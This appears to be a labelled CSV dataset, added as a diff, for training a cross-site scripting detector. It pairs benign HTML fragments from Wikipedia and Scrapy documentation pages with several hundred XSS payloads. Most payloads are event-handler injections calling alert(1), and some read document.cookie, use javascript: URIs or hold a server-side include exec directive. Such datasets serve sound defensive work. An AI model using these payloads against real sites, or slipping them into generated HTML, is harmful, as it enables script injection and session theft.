@@ -1,0 +1,1001 @@
+Sentence,Label
+"	 </span> <span class=""reference-text""><cite class=""citation news"">Sample, Ian (18 October 2017). <a rel=""nofollow"" class=""external text"" href=""https://www.theguardian.com/science/2017/oct/18/its-able-to-create-knowledge-itself-google-unveils-ai-learns-all-on-its-own"">""<span class=""cs1-kern-left"">' ",0
+"	<div id=""p-logo"" role=""banner"">",0
+"<noframes onclick=""alert(1)"">test</noframes>",1
+"<video oncut=""alert(1)"" contenteditable>test</video>",1
+"<div draggable=""true"" contenteditable>drag me</div><ruby ondrop=alert(1) contenteditable>drop here</ruby>",1
+<rt id=x tabindex=1 ondeactivate=alert(1)></rt><input id=y autofocus>,1
+"<svg onbeforecopy=""alert(1)"" contenteditable>test</svg>",1
+"<li id=""cite_note-sak2015-271""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-sak2015_271-0"">^ </a> </b> ",0
+"<img usemap=#x><map name=""x""><area href onfocus=alert(1) id=x>",1
+<mark onblur=alert(1) tabindex=1 id=x></mark><input autofocus>,1
+"<li>Ask or search questions in the <a class=""reference external"" href=""https://www.reddit.com/r/scrapy/"">Scrapy subreddit</a>.</li>",0
+<img id=x tabindex=1 onbeforeactivate=alert(1)></img>,1
+"<col onkeypress=""alert(1)"" contenteditable>test</col>",1
+<noscript onblur=alert(1) tabindex=1 id=x></noscript><input autofocus>,1
+"<th draggable=""true"" ondrag=""alert(1)"">test</th>",1
+"<slot draggable=""true"" ondragleave=""alert(1)"">test</slot>",1
+"<li><a href=""/wiki/Philosophy_of_computer_science"" title=""Philosophy of computer science"">Computer science </a> </li> </ul> </li>",0
+"<content onbeforecopy=""alert(1)"" contenteditable>test</content>",1
+<noframes onpointerout=alert(1)>XSS</noframes>,1
+"<br oncontextmenu=""alert(1)"">test</br>",1
+<image src=validimage.png onloadend=alert(1)>,1
+"<li><a href=""/wiki/Interactive_evolutionary_computation"" title=""Interactive evolutionary computation"">Interactive evolutionary computation </a> </li>",0
+"<isindex onbeforecopy=""alert(1)"" contenteditable>test</isindex>",1
+"<li class=""toclevel-2 tocsection-28""><a href=""#Logic""><span class=""tocnumber"">6.2 ",0
+<form onsubmit=alert(1)><input type=submit>,1
+"<article onmouseenter=""alert(1)"">test</article>",1
+"          <dd><a href=""//docs.scrapy.org/_/downloads/en/latest/htmlzip/"">html</a></dd>",0
+"<li><a href=""/wiki/Cross-validation_(statistics)"" title=""Cross-validation (statistics)"">Cross-validation </a> </li> </ul>",0
+"<!--#exec cmd=""/bin/echo '<SCR'""-->",1
+"<li><a href=""/wiki/Philosophy_of_space_and_time"" title=""Philosophy of space and time"">Space and time </a> </li> </ul>",0
+"<sub draggable=""true"" ondragleave=""alert(1)"">test</sub>",1
+<audio onpointerover=alert(1)>XSS</audio>,1
+<ol id=x tabindex=1 onactivate=alert(1)></ol>,1
+" </p><p>Several different forms of logic are used in AI research. <a href=""/wiki/Propositional_logic"" class=""mw-redirect"" title=""Propositional logic"">Propositional logic </a><sup id=""cite_ref-Propositional_logic_197-0"" class=""reference""><a href=""#cite_note-Propositional_logic-197"">&#91;193&#93; </a> </sup> involves <a href=""/wiki/Truth_function"" title=""Truth function"">truth functions </a> such as ""or"" and ""not"". <a href=""/wiki/First-order_logic"" title=""First-order logic"">First-order logic </a><sup id=""cite_ref-First-order_logic_198-0"" class=""reference""><a href=""#cite_note-First-order_logic-198"">&#91;194&#93; </a> </sup> adds <a href=""/wiki/Quantifier_(logic)"" title=""Quantifier (logic)"">quantifiers </a> and <a href=""/wiki/Predicate_(mathematical_logic)"" title=""Predicate (mathematical logic)"">predicates </a>, and can express facts about objects, their properties, and their relations with each other. <a href=""/wiki/Fuzzy_set_theory"" class=""mw-redirect"" title=""Fuzzy set theory"">Fuzzy set theory </a> assigns a ""degree of truth"" (between 0 and 1) to vague statements such as ""Alice is old"" (or rich, or tall, or hungry) that are too linguistically imprecise to be completely true or false. <a href=""/wiki/Fuzzy_logic"" title=""Fuzzy logic"">Fuzzy logic </a> is successfully used in <a href=""/wiki/Control_system"" title=""Control system"">control systems </a> to allow experts to contribute vague rules such as ""if you are close to the destination station and moving fast, increase the train's brake pressure""; these vague rules can then be numerically refined within the system. Fuzzy logic fails to scale well in knowledge bases; many AI researchers question the validity of chaining fuzzy-logic inferences.<sup id=""cite_ref-200"" class=""reference""><a href=""#cite_note-200"">&#91;e&#93; </a> </sup><sup id=""cite_ref-Fuzzy_logic_201-0"" class=""reference""><a href=""#cite_note-Fuzzy_logic-201"">&#91;196&#93; </a> </sup><sup id=""cite_ref-202"" class=""reference""><a href=""#cite_note-202"">&#91;197&#93; </a> </sup>",0
+"<big onbeforecopy=""alert(1)"" contenteditable>test</big>",1
+"	 </span> <span class=""reference-text""><cite id=""CITEREFTuring1948"" class=""citation""><a href=""/wiki/Alan_Turing"" title=""Alan Turing"">Turing, Alan </a> (1948), ""Machine Intelligence"",  in Copeland, B. Jack (ed.), <i>The Essential Turing: The ideas that gave birth to the computer age </i>, Oxford: Oxford University Press, p.&#160;412, <a href=""/wiki/International_Standard_Book_Number"" title=""International Standard Book Number"">ISBN </a>&#160;<a href=""/wiki/Special:BookSources/978-0-19-825080-7"" title=""Special:BookSources/978-0-19-825080-7""><bdi>978-0-19-825080-7 </bdi> </a> </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=bookitem&amp;rft.atitle=Machine+Intelligence&amp;rft.btitle=The+Essential+Turing%3A+The+ideas+that+gave+birth+to+the+computer+age&amp;rft.place=Oxford&amp;rft.pages=412&amp;rft.pub=Oxford+University+Press&amp;rft.date=1948&amp;rft.isbn=978-0-19-825080-7&amp;rft.aulast=Turing&amp;rft.aufirst=Alan&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0
+<input onpointerout=alert(1)>XSS</input>,1
+"<pre onbeforecut=""alert(1)"" contenteditable>test</pre>",1
+<xmp id=x tabindex=1 onfocusin=alert(1)></xmp>,1
+"<li class=""toctree-l1""><a class=""reference internal"" href=""topics/autothrottle.html"">AutoThrottle extension</a></li>",0
+"<dt><a class=""reference internal"" href=""topics/developer-tools.html""><span class=""doc"">Using your browser’s Developer Tools for scraping",0
+"<style>@keyframes x{}</style><noscript style=""animation-name:x"" onanimationend=""alert(1)""></noscript>",1
+"<li id=""cite_note-Cyc-164""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-Cyc_164-0"">^ </a> </b> ",0
+"<style>@keyframes slidein {}</style><sup style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></sup>",1
+<figure id=x tabindex=1 onfocusin=alert(1)></figure>,1
+"<li><a href=""/wiki/Laws_of_robotics"" title=""Laws of robotics"">Laws </a> </li>",0
+"	 </span> <span class=""reference-text""><cite class=""citation web""><a rel=""nofollow"" class=""external text"" href=""https://futurism.com/artificial-intelligence-experts-fear/amp"">""Five experts share what scares them the most about AI"" </a>. 5 September 2018. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=unknown&amp;rft.btitle=Five+experts+share+what+scares+them+the+most+about+AI&amp;rft.date=2018-09-05&amp;rft_id=https%3A%2F%2Ffuturism.com%2Fartificial-intelligence-experts-fear%2Famp&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0
+"<style>@keyframes x{}</style><tbody style=""animation-name:x"" onanimationend=""alert(1)""></tbody>",1
+"<a draggable=""true"" ondrag=""alert(1)"">test</a>",1
+"<h1 ondblclick=""alert(1)"">test</h1>",1
+"<style>@keyframes x{}</style><tfoot style=""animation-name:x"" onanimationend=""alert(1)""></tfoot>",1
+"<li><a href=""#CITEREFPooleMackworthGoebel1998"">Poole, Mackworth &amp; Goebel 1998 </a>, pp.&#160;403–408, </li>",0
+"<div role=""navigation"" class=""navbox"" aria-labelledby=""John_McCarthy"" style=""padding:3px""><table class=""nowraplinks hlist mw-collapsible autocollapse navbox-inner"" style=""border-spacing:0;background:transparent;color:inherit""><tbody><tr><th scope=""col"" class=""navbox-title"" colspan=""2"">",0
+"	<ul id=""footer-info"" class="""">",0
+"<svg onclick=""alert(1)"">test</svg>",1
+"<legend ondblclick=""alert(1)"">test</legend>",1
+<option id=x tabindex=1 onbeforeactivate=alert(1)></option>,1
+<address onblur=alert(1) tabindex=1 id=x></address><input autofocus>,1
+"<li><a href=""/wiki/Theory_choice"" title=""Theory choice"">Theory choice </a> </li>",0
+"<style>:target {transform: rotate(180deg);}</style><iframe id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></iframe>",1
+<object id=x tabindex=1 ondeactivate=alert(1)></object><input id=y autofocus>,1
+<spacer onpointerout=alert(1)>XSS</spacer>,1
+"<del onmousedown=""alert(1)"">test</del>",1
+"<td onmousedown=""alert(1)"">test</td>",1
+<summary id=x tabindex=1 onbeforedeactivate=alert(1)></summary><input autofocus>,1
+"	 <div class=""thumbinner"" style=""width:222px;""><a href=""/wiki/File:Hierarchical-control-system.svg"" class=""image""><img alt="""" src=""//upload.wikimedia.org/wikipedia/commons/thumb/7/76/Hierarchical-control-system.svg/220px-Hierarchical-control-system.svg.png"" decoding=""async"" width=""220"" height=""199"" class=""thumbimage"" srcset=""//upload.wikimedia.org/wikipedia/commons/thumb/7/76/Hierarchical-control-system.svg/330px-Hierarchical-control-system.svg.png 1.5x, //upload.wikimedia.org/wikipedia/commons/thumb/7/76/Hierarchical-control-system.svg/440px-Hierarchical-control-system.svg.png 2x"" data-file-width=""596"" data-file-height=""539"" /> </a>  <div class=""thumbcaption"">",0
+"<li id=""cite_note-208""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-208"">^ </a> </b> ",0
+"=""javascript:alert('')",1
+<menu id=x tabindex=1 onactivate=alert(1)></menu>,1
+"    <section data-toggle=""wy-nav-shift"" class=""wy-nav-content-wrap"">",0
+"<LINK REL=""stylesheet"" HREF=""http://.rocks/.css"">",1
+"<style>:target {transform: rotate(180deg);}</style><shadow id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></shadow>",1
+"<a href=""/wiki/Hidden_Markov_model"" title=""Hidden Markov model"">Hidden Markov model </a>:",0
+"<style>:target {color: red;}</style><data id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></data>",1
+"<rb onkeydown=""alert(1)"" contenteditable>test</rb>",1
+"<li id=""cite_note-hannun2014-268""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-hannun2014_268-0"">^ </a> </b> ",0
+"<h4><span class=""mw-headline"" id=""Cognitive_simulation"">Cognitive simulation ",0
+"<base onbeforepaste=""alert(1)"" contenteditable>test</base>",1
+<nextid id=x tabindex=1 onbeforedeactivate=alert(1)></nextid><input autofocus>,1
+"			<div id=""mw-fr-revisiontag"" class=""flaggedrevs_short flaggedrevs_stable_synced plainlinks noprint"">",0
+"<wbr onkeydown=""alert(1)"" contenteditable>test</wbr>",1
+"<li><a href=""/wiki/CMA-ES"" title=""CMA-ES"">Covariance Matrix Adaptation Evolution Strategy (CMA-ES) </a> </li>",0
+<animatemotion onpointerover=alert(1)>XSS</animatemotion>,1
+"<th oncopy=""alert(1)"" contenteditable>test</th>",1
+<map onpointerdown=alert(1)>XSS</map>,1
+writetitle(),1
+"<script onkeyup=""alert(1)"" contenteditable>test</script>",1
+"<var oncontextmenu=""alert(1)"">test</var>",1
+"<h4><span class=""mw-headline"" id=""Deep_recurrent_neural_networks"">Deep recurrent neural networks ",0
+<code onpointermove=alert(1)>XSS</code>,1
+<xmp onpointerup=alert(1)>XSS</xmp>,1
+"<pre onmouseup=""alert(1)"">test</pre>",1
+"<li class=""toclevel-2 tocsection-41""><a href=""#Law-related_professions""><span class=""tocnumber"">7.6 ",0
+"<li id=""cite_note-AI_at_MIT_in_the_60s-163""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-AI_at_MIT_in_the_60s_163-0"">^ </a> </b> ",0
+<q id=x tabindex=1 onfocusin=alert(1)></q>,1
+"<menuitem onmouseup=""alert(1)"">test</menuitem>",1
+"<var onmouseover=""alert(1)"">test</var>",1
+" </p><p>With social media sites overtaking TV as a source for news for young people and news organizations increasingly reliant on social media platforms for generating distribution,<sup id=""cite_ref-297"" class=""reference""><a href=""#cite_note-297"">&#91;286&#93; </a> </sup> major publishers now use artificial intelligence (AI) technology to post stories more effectively and generate higher volumes of traffic.<sup id=""cite_ref-298"" class=""reference""><a href=""#cite_note-298"">&#91;287&#93; </a> </sup>",0
+"<li><a href=""#CITEREFKoza1992"">Koza 1992 </a>, </li>",0
+"<li><span class=""nowrap""><a href=""/wiki/National_Diet_Library"" title=""National Diet Library"">NDL </a>: <span class=""uid""><a rel=""nofollow"" class=""external text"" href=""https://id.ndl.go.jp/auth/ndlna/00574798"">00574798 </a> ",0
+"<div draggable=""true"" contenteditable>drag me</div><ol ondrop=alert(1) contenteditable>drop here</ol>",1
+	<ul >,0
+"setTimeout(\\""writetitle()\\"",$\_GET\[\])",1
+"<command onmouseout=""alert(1)"">test</command>",1
+"document.getElementsByClassName(""example"")",1
+"<br draggable=""true"" ondragleave=""alert(1)"">test</br>",1
+<aside onpointerout=alert(1)>XSS</aside>,1
+"<div draggable=""true"" contenteditable>drag me</div><basefont ondrop=alert(1) contenteditable>drop here</basefont>",1
+"SRC=# onmouseover=""alert(document.cookie)",1
+"<style>:target {color: red;}</style><hgroup id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></hgroup>",1
+"<li id=""cite_note-399""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-399"">^ </a> </b> ",0
+"      <li class=""wy-breadcrumbs-aside"">",0
+"<ruby onpaste=""alert(1)"" contenteditable>test</ruby>",1
+"<li><a href=""/wiki/Video_game"" title=""Video game"">Video games </a> </li>",0
+"<style>:target {transform: rotate(180deg);}</style><object id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></object>",1
+<dl><dt>Intelligent agent paradigm </dt>,0
+"<noscript draggable=""true"" ondragend=""alert(1)"">test</noscript>",1
+<hr onblur=alert(1) tabindex=1 id=x></hr><input autofocus>,1
+"<ul><li><a href=""#CITEREFRussellNorvig2003"">Russell &amp; Norvig 2003 </a>, pp.&#160;718 </li> </ul>",0
+"<frame oncopy=""alert(1)"" contenteditable>test</frame>",1
+"<ins onmousedown=""alert(1)"">test</ins>",1
+"<div role=""note"" class=""hatnote navigation-not-searchable"">Main articles: <a href=""/wiki/Artificial_neural_network"" title=""Artificial neural network"">Artificial neural network </a> and <a href=""/wiki/Connectionism"" title=""Connectionism"">Connectionism </a> </div>",0
+"	 </span> <span class=""reference-text"">Celli, Fabio, Pietro Zani Massani, and Bruno Lepri. ""Profilio: Psychometric Profiling to Boost Social Media Advertising."" Proceedings of the 2017 ACM on Multimedia Conference. ACM, 2017  <a rel=""nofollow"" class=""external autonumber"" href=""https://www.researchgate.net/publication/320542489_Profilio_Psychometric_Profiling_to_Boost_Social_Media_Advertising"">[1] </a> ",0
+"<footer onpaste=""alert(1)"" contenteditable>test</footer>",1
+"<span onmouseover=""alert(1)"">test</span>",1
+"<li><a href=""/wiki/Enterprise_software"" title=""Enterprise software"">Enterprise software </a> </li>",0
+"<datalist onmouseup=""alert(1)"">test</datalist>",1
+<dl onpointerenter=alert(1)>XSS</dl>,1
+"<li><a href=""/wiki/Centre_for_the_Study_of_Existential_Risk"" title=""Centre for the Study of Existential Risk"">Centre for the Study of Existential Risk </a> </li>",0
+"<dialog draggable=""true"" ondragstart=""alert(1)"">test</dialog>",1
+<bgsound id=x tabindex=1 onbeforeactivate=alert(1)></bgsound>,1
+<acronym onpointerenter=alert(1)>XSS</acronym>,1
+<sup id=x tabindex=1 onbeforeactivate=alert(1)></sup>,1
+<hgroup id=x tabindex=1 onfocusin=alert(1)></hgroup>,1
+"<li class=""toclevel-2 tocsection-46""><a href=""#Advertising""><span class=""tocnumber"">7.11 ",0
+"	 </span> <span class=""reference-text""><cite class=""citation web""><a rel=""nofollow"" class=""external text"" href=""https://searcherp.techtarget.com/news/252460208/Oracle-CEO-Mark-Hurd-sees-no-reason-to-fear-ERP-AI"">""Oracle CEO Mark Hurd sees no reason to fear ERP AI"" </a>. <i>SearchERP </i><span class=""reference-accessdate"">. Retrieved <span class=""nowrap"">6 May ",0
+"	 </span> <span class=""reference-text""><cite class=""citation web"">Christy, Charles A. (17 January 1990). <a rel=""nofollow"" class=""external text"" href=""https://www.latimes.com/archives/la-xpm-1990-01-17-fi-233-story.html"">""Impact of Artificial Intelligence on Banking"" </a>. <i>latimes.com </i><span class=""reference-accessdate"">. Retrieved <span class=""nowrap"">10 September ",0
+<marquee onpointermove=alert(1)>XSS</marquee>,1
+"<pre onmouseout=""alert(1)"">test</pre>",1
+"<li><a href=""/wiki/Robotics_suite"" title=""Robotics suite"">Suite </a> </li>",0
+<hgroup onpointerover=alert(1)>XSS</hgroup>,1
+<embed onpointerout=alert(1)>XSS</embed>,1
+"<div draggable=""true"" contenteditable>drag me</div><big ondrop=alert(1) contenteditable>drop here</big>",1
+"<li class=""toclevel-2 tocsection-34""><a href=""#Evaluating_progress""><span class=""tocnumber"">6.6 ",0
+<title onpointerup=alert(1)>XSS</title>,1
+"<dt><a class=""reference internal"" href=""topics/logging.html""><span class=""doc"">Logging",0
+"<frame onbeforecut=""alert(1)"" contenteditable>test</frame>",1
+"<ul><li><cite class=""citation encyclopaedia""><a rel=""nofollow"" class=""external text"" href=""http://www.iep.utm.edu/art-inte"">""Artificial Intelligence"" </a>. <i><a href=""/wiki/Internet_Encyclopedia_of_Philosophy"" title=""Internet Encyclopedia of Philosophy"">Internet Encyclopedia of Philosophy </a> </i>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=bookitem&amp;rft.atitle=Artificial+Intelligence&amp;rft.btitle=Internet+Encyclopedia+of+Philosophy&amp;rft_id=http%3A%2F%2Fwww.iep.utm.edu%2Fart-inte&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0
+"<script draggable=""true"" ondragstart=""alert(1)"">test</script>",1
+"	 </span> <span class=""reference-text""><cite class=""citation journal"">Lieto, Antonio; Lebiere, Christian; Oltramari, Alessandro (May 2018). ""The knowledge level in cognitive architectures: Current limitations and possibile developments"". <i>Cognitive Systems Research </i>. <b>48 </b>: 39–55. <a href=""/wiki/Digital_object_identifier"" title=""Digital object identifier"">doi </a>:<a rel=""nofollow"" class=""external text"" href=""https://doi.org/10.1016%2Fj.cogsys.2017.05.001"">10.1016/j.cogsys.2017.05.001 </a>. <a href=""/wiki/Handle_System"" title=""Handle System"">hdl </a>:<a rel=""nofollow"" class=""external text"" href=""//hdl.handle.net/2318%2F1665207"">2318/1665207 </a>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Cognitive+Systems+Research&amp;rft.atitle=The+knowledge+level+in+cognitive+architectures%3A+Current+limitations+and+possibile+developments&amp;rft.volume=48&amp;rft.pages=39-55&amp;rft.date=2018-05&amp;rft_id=info%3Ahdl%2F2318%2F1665207&amp;rft_id=info%3Adoi%2F10.1016%2Fj.cogsys.2017.05.001&amp;rft.aulast=Lieto&amp;rft.aufirst=Antonio&amp;rft.au=Lebiere%2C+Christian&amp;rft.au=Oltramari%2C+Alessandro&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0
+"<sup ondblclick=""alert(1)"">test</sup>",1
+<dialog id=x tabindex=1 onbeforeactivate=alert(1)></dialog>,1
+"<style>@keyframes slidein {}</style><isindex style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></isindex>",1
+"<hgroup onclick=""alert(1)"">test</hgroup>",1
+<basefont onpointerleave=alert(1)>XSS</basefont>,1
+"<col onclick=""alert(1)"">test</col>",1
+"<head draggable=""true"" ondragend=""alert(1)"">test</head>",1
+"	<span class=""mw-editsection""><span class=""mw-editsection-bracket"">[ ",0
+"<input onmouseup=""alert(1)"">test</input>",1
+<rt onblur=alert(1) tabindex=1 id=x></rt><input autofocus>,1
+"<li><a href=""/wiki/Valentin_Turchin"" title=""Valentin Turchin"">Valentin Turchin </a> </li>",0
+"<li class=""toctree-l1""><a class=""reference internal"" href=""topics/selectors.html"">Selectors</a></li>",0
+<wbr id=x tabindex=1 onbeforeactivate=alert(1)></wbr>,1
+"<style>@keyframes slidein {}</style><i style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></i>",1
+"<title oncopy=""alert(1)"" contenteditable>test</title>",1
+"<menu draggable=""true"" ondragenter=""alert(1)"">test</menu>",1
+"<dd onkeydown=""alert(1)"" contenteditable>test</dd>",1
+"<address onkeyup=""alert(1)"" contenteditable>test</address>",1
+"	 <div style=""padding:0em 0.25em"">",0
+"<plaintext onclick=""alert(1)"">test</plaintext>",1
+"<li id=""cite_note-193""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-193"">^ </a> </b> ",0
+"<abbr onbeforecopy=""alert(1)"" contenteditable>test</abbr>",1
+<q onpointerup=alert(1)>XSS</q>,1
+"<style>:target {color: red;}</style><iframe id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></iframe>",1
+"Applications of natural language processing, including <a href=""/wiki/Information_retrieval"" title=""Information retrieval"">information retrieval </a> (i.e. <a href=""/wiki/Text_mining"" title=""Text mining"">text mining </a>) and <a href=""/wiki/Machine_translation"" title=""Machine translation"">machine translation </a>:",0
+<img src=validimage.png onload=alert(1)>,1
+"<area onkeydown=""alert(1)"" contenteditable>test</area>",1
+"	 </span>. <a href=""/wiki/Digital_object_identifier"" title=""Digital object identifier"">doi </a>:<a rel=""nofollow"" class=""external text"" href=""https://doi.org/10.1109%2FTII.2012.2219061"">10.1109/TII.2012.2219061 </a>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=IEEE+Transactions+on+Industrial+Informatics&amp;rft.atitle=An+Overview+of+Recent+Progress+in+the+Study+of+Distributed+Multi-Agent+Coordination&amp;rft.volume=9&amp;rft.issue=1&amp;rft.pages=427-438&amp;rft.date=2013-02&amp;rft_id=info%3Aarxiv%2F1207.3231&amp;rft_id=info%3Adoi%2F10.1109%2FTII.2012.2219061&amp;rft.aulast=Cao&amp;rft.aufirst=Yongcan&amp;rft.au=Yu%2C+Wenwu&amp;rft.au=Ren%2C+Wei&amp;rft.au=Chen%2C+Guanrong&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0
+<strike onpointerout=alert(1)>XSS</strike>,1
+"<rb draggable=""true"" ondragstart=""alert(1)"">test</rb>",1
+"<style>:target {transform: rotate(180deg);}</style><dl id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></dl>",1
+<button onfocusout=alert(1) id=x></button><input autofocus>,1
+"<image onmouseleave=""alert(1)"">test</image>",1
+" <tr><td class=""plainlist"" style=""padding:0 0.1em 0.4em"">",0
+"<rt draggable=""true"" ondragenter=""alert(1)"">test</rt>",1
+"<style draggable=""true"" ondragstart=""alert(1)"">test</style>",1
+<input2 onpointermove=alert(1)>XSS</input2>,1
+"<style>:target {color: red;}</style><div id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></div>",1
+"<html onpaste=""alert(1)"" contenteditable>test</html>",1
+"<h3><span class=""mw-headline"" id=""Knowledge_representation"">Knowledge representation ",0
+<spacer onpointerleave=alert(1)>XSS</spacer>,1
+"<spacer onbeforecopy=""alert(1)"" contenteditable>test</spacer>",1
+"<dl draggable=""true"" ondragleave=""alert(1)"">test</dl>",1
+"	 </span> <span class=""toctext"">Anti-logic or scruffy ",0
+"<fieldset oncopy=""alert(1)"" contenteditable>test</fieldset>",1
+<summary onpointermove=alert(1)>XSS</summary>,1
+<col onpointerover=alert(1)>XSS</col>,1
+<svg><rb onload=alert(1)></rb>,1
+<xmp onpointerenter=alert(1)>XSS</xmp>,1
+<header onpointerdown=alert(1)>XSS</header>,1
+<p id=x tabindex=1 ondeactivate=alert(1)></p><input id=y autofocus>,1
+<frame id=x tabindex=1 onbeforeactivate=alert(1)></frame>,1
+<keygen onblur=alert(1) tabindex=1 id=x></keygen><input autofocus>,1
+ </div> </td> </tr> </tbody> </table> </div>,0
+"	 </span> from the original on 9 August 2007. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Robotics+and+Autonomous+Systems&amp;rft.atitle=Elephants+Don%27t+Play+Chess&amp;rft.volume=6&amp;rft.issue=1%E2%80%932&amp;rft.pages=3-15&amp;rft.date=1990&amp;rft_id=%2F%2Fciteseerx.ist.psu.edu%2Fviewdoc%2Fsummary%3Fdoi%3D10.1.1.588.7539&amp;rft_id=info%3Adoi%2F10.1016%2FS0921-8890%2805%2980025-9&amp;rft.aulast=Brooks&amp;rft.aufirst=Rodney&amp;rft_id=http%3A%2F%2Fpeople.csail.mit.edu%2Fbrooks%2Fpapers%2Felephants.pdf&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0
+<rp id=x tabindex=1 onbeforeactivate=alert(1)></rp>,1
+"<style>:target {transform: rotate(180deg);}</style><command id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></command>",1
+" </div> </td> </tr><tr><th scope=""row"" class=""navbox-group"" style=""width:1%"">In fiction </th><td class=""navbox-list navbox-odd hlist"" style=""text-align:left;border-left-width:2px;border-left-style:solid;width:100%;padding:0px"">",0
+"SRC=""javascript:alert('')",1
+"<li><a href=""#CITEREFCrevier1993"">Crevier 1993 </a>, pp.&#160;145–149 </li> </ul>",0
+"<fieldset onmousedown=""alert(1)"">test</fieldset>",1
+"<ruby onmousedown=""alert(1)"">test</ruby>",1
+<center id=x tabindex=1 onbeforeactivate=alert(1)></center>,1
+"<div draggable=""true"" contenteditable>drag me</div><strong ondrop=alert(1) contenteditable>drop here</strong>",1
+<progress onpointerleave=alert(1)>XSS</progress>,1
+<dfn id=x tabindex=1 ondeactivate=alert(1)></dfn><input id=y autofocus>,1
+<meta id=x tabindex=1 onactivate=alert(1)></meta>,1
+<dfn onpointerleave=alert(1)>XSS</dfn>,1
+"<var oncut=""alert(1)"" contenteditable>test</var>",1
+"<br draggable=""true"" ondragenter=""alert(1)"">test</br>",1
+<isindex type=image src=1 onerror=alert()>,1
+<animate onpointerout=alert(1)>XSS</animate>,1
+"<li id=""cite_note-FOOTNOTERussellNorvig20092-2""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-FOOTNOTERussellNorvig20092_2-0"">^ </a> </b> ",0
+"<style>@keyframes slidein {}</style><data style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></data>",1
+"<element oncut=""alert(1)"" contenteditable>test</element>",1
+"<del onpaste=""alert(1)"" contenteditable>test</del>",1
+"<b onmouseleave=""alert(1)"">test</b>",1
+"<li class=""toctree-l1""><a class=""reference internal"" href=""topics/webservice.html"">Web Service</a></li>",0
+<wbr id=x tabindex=1 onfocus=alert(1)></wbr>,1
+"<applet onmouseout=""alert(1)"">test</applet>",1
+"	 </span>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=The+Washington+Post&amp;rft.atitle=Bill+Gates+on+dangers+of+artificial+intelligence%3A+%27I+don%27t+understand+why+some+people+are+not+concerned%27&amp;rft.date=2015-01-28&amp;rft.issn=0190-8286&amp;rft.aulast=Holley&amp;rft.aufirst=Peter&amp;rft_id=https%3A%2F%2Fwww.washingtonpost.com%2Fnews%2Fthe-switch%2Fwp%2F2015%2F01%2F28%2Fbill-gates-on-dangers-of-artificial-intelligence-dont-understand-why-some-people-are-not-concerned%2F&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0
+<ul id=x tabindex=1 onactivate=alert(1)></ul>,1
+<time id=x tabindex=1 onbeforeactivate=alert(1)></time>,1
+"<div role=""note"" class=""hatnote navigation-not-searchable"">Main article: <a href=""/wiki/Recurrent_neural_networks"" class=""mw-redirect"" title=""Recurrent neural networks"">Recurrent neural networks </a> </div>",0
+"<article ondblclick=""alert(1)"">test</article>",1
+"<a href=""/wiki/Gaussian_mixture_model"" class=""mw-redirect"" title=""Gaussian mixture model"">Gaussian mixture model </a>:",0
+"<label draggable=""true"" ondragleave=""alert(1)"">test</label>",1
+" </p><p>These algorithms proved to be insufficient for solving large reasoning problems, because they experienced a ""combinatorial explosion"": they became exponentially slower as the problems grew larger.<sup id=""cite_ref-Intractability_68-1"" class=""reference""><a href=""#cite_note-Intractability-68"">&#91;66&#93; </a> </sup> In fact, even humans rarely use the step-by-step deduction that early AI research was able to model. They solve most of their problems using fast, intuitive judgments.<sup id=""cite_ref-Psychological_evidence_of_sub-symbolic_reasoning_90-0"" class=""reference""><a href=""#cite_note-Psychological_evidence_of_sub-symbolic_reasoning-90"">&#91;87&#93; </a> </sup>",0
+"<li><a href=""/wiki/Integrated_circuit"" title=""Integrated circuit"">Integrated circuit </a> </li>",0
+<data id=x tabindex=1 ondeactivate=alert(1)></data><input id=y autofocus>,1
